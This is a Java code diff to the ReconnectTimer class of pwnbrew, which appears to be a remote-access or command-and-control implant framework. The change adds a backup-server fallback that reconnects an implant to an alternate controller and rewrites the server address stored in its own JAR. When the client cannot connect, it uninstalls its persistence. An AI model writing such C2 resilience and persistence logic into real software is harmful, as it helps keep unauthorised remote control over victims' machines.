@@ -54,6 +54,7 @@ import java.util.Queue;
 import java.util.Timer;
 import java.util.TimerTask;
 import java.util.logging.Level;
+import java.util.logging.Logger;
 import pwnbrew.ClientConfig;
 import pwnbrew.Persistence;
 import pwnbrew.concurrent.LockListener;
@@ -73,11 +74,12 @@ public class ReconnectTimer extends ManagedRunnable implements LockListener {
     
     //Static instance
     private static ReconnectTimer theTimer = null;
-    private final Queue<String> theReconnectTimeList = new LinkedList<>();
-    
+    private final Queue<String> theReconnectTimeList = new LinkedList<>();    
     private int lockVal = 0;
     
     private static final String NAME_Class = ReconnectTimer.class.getSimpleName();
+    private String backupServerIp = null;
+    private int backupServerPort = -1;
            
 
     // ==========================================================================
@@ -104,6 +106,27 @@ public class ReconnectTimer extends ManagedRunnable implements LockListener {
 
     }/* END getReconnectTimer() */
     
+     // ==========================================================================
+    /**
+     *   Sets the IP address for the backup server
+     * @param passedIp
+    */
+    public synchronized void setBackupServerIp( String passedIp ) {
+
+        backupServerIp = passedIp;  
+        
+    }/* END setBackupServerIp() */
+    
+       // ==========================================================================
+    /**
+     *   Sets the IP address for the backup server
+     * @param passedPort
+    */
+    public synchronized void setBackupServerPort( int passedPort ) {
+
+        backupServerPort = passedPort;  
+        
+    }/* END setBackupServerPort() */
      
     // ==========================================================================
     /**
@@ -112,11 +135,10 @@ public class ReconnectTimer extends ManagedRunnable implements LockListener {
     */
     public synchronized void setCommManager( CommManager passedProvider ) {
 
-        if( passedProvider != null ){
-            theCommManager = passedProvider;       
-        }
+        if( passedProvider != null )
+            theCommManager = passedProvider;  
         
-    }/* END setDetectorProvider() */
+    }/* END setCommManager() */
 
     // ==========================================================================
     /**
@@ -127,12 +149,35 @@ public class ReconnectTimer extends ManagedRunnable implements LockListener {
     public void go() {
         
         boolean connected = false;
+        
+        //Get the socket router
+        ClientConfig theConf = ClientConfig.getConfig();
+        String serverIp = theConf.getServerIp();
+        int thePort = ClientConfig.getConfig().getSocketPort();
+        ClientPortRouter aPR = (ClientPortRouter) theCommManager.getPortRouter( thePort );
+        
+        if(aPR == null){
+            try {
+                ControlMessageManager aCMManager = ControlMessageManager.getControlMessageManager();
+                if( aCMManager == null ){
+                    aCMManager = ControlMessageManager.initialize( theCommManager );
+                }
+            } catch ( IOException | LoggableException ex) {
+                RemoteLog.log(Level.SEVERE, NAME_Class, "start()", ex.getMessage(), ex);
+                return;
+            }
+
+            aPR = (ClientPortRouter) theCommManager.getPortRouter( thePort );
+            if(aPR == null)
+                return;
+        }
+        
         try {                 
             
             Calendar theCalendar = Calendar.getInstance(); 
             theCalendar.setTime( new Date() );
             theCalendar.add(Calendar.SECOND, 5 );
-            Date theDate;
+            Date theDate = theCalendar.getTime();
             
             while( !connected && !shutdownRequested ){
             
@@ -159,43 +204,14 @@ public class ReconnectTimer extends ManagedRunnable implements LockListener {
                         continue;                   
                     }                   
                     
-                } else {
-                    
-                   //Get current time
-                   DebugPrinter.printMessage(NAME_Class, "No time set.");
-                   theDate = theCalendar.getTime();
                 }        
             
                 //Wait till a certain time
                 if( theDate != null ){
                     
                     waitUntil(theDate);  
-                    try {
-                        
-                        //Get the socket router
-                        int thePort = ClientConfig.getConfig().getSocketPort();
-                        ClientPortRouter aPR = (ClientPortRouter) theCommManager.getPortRouter( thePort );
-
-                        //Initiate the file transfer
-                        if(aPR == null){
-                            ControlMessageManager aCMManager = ControlMessageManager.getControlMessageManager();
-                            if( aCMManager == null ){
-                                aCMManager = ControlMessageManager.initialize( theCommManager );
-                            }
-                            
-                            aPR = (ClientPortRouter) theCommManager.getPortRouter( thePort );
-                            if(aPR == null)
-                                return;
-                            
-                        }
-
-                        //Create the connection
-                        connected = aPR.ensureConnectivity( thePort, this );                          
-                        
-
-                    } catch ( IOException | LoggableException ex) {
-                        RemoteLog.log(Level.SEVERE, NAME_Class, "start()", ex.getMessage(), ex);
-                    }
+                    connected = aPR.ensureConnectivity( serverIp, thePort, this );
+                    theDate = null;
                    
                 } else  {
                     break;
@@ -210,12 +226,36 @@ public class ReconnectTimer extends ManagedRunnable implements LockListener {
         //Uninstall
         if( !connected ){
             
+            if( backupServerIp != null && backupServerPort != -1 ){
+                connected = aPR.ensureConnectivity(backupServerIp, backupServerPort, this);
+                if( connected ){
+                    theConf.setServerIp(backupServerIp);
+                    theConf.setSocketPort( Integer.toString( backupServerPort ));
+                    
+                    try {
+                        //Set JAR conf back to old IP
+                        Utilities.updateServerInfoInJar(backupServerIp +":"+ Integer.toString( backupServerPort));
+                    } catch (ClassNotFoundException | IOException ex) {
+                        RemoteLog.log(Level.SEVERE, NAME_Class, "go()", ex.getMessage(), ex);
+                    }
+                                        
+                    //Reset things
+                    theReconnectTimeList.clear();
+                    backupServerIp = null;
+                    backupServerPort = -1;
+                    return;
+                }               
+            }
+            
             //Uninstall
             Persistence.uninstall( (CommManager)theCommManager);    
             
-        } else {            
-            theReconnectTimeList.clear();
-        }
+        }     
+     
+        //Reset things
+        theReconnectTimeList.clear();
+        backupServerIp = null;
+        backupServerPort = -1;
         
     }
     
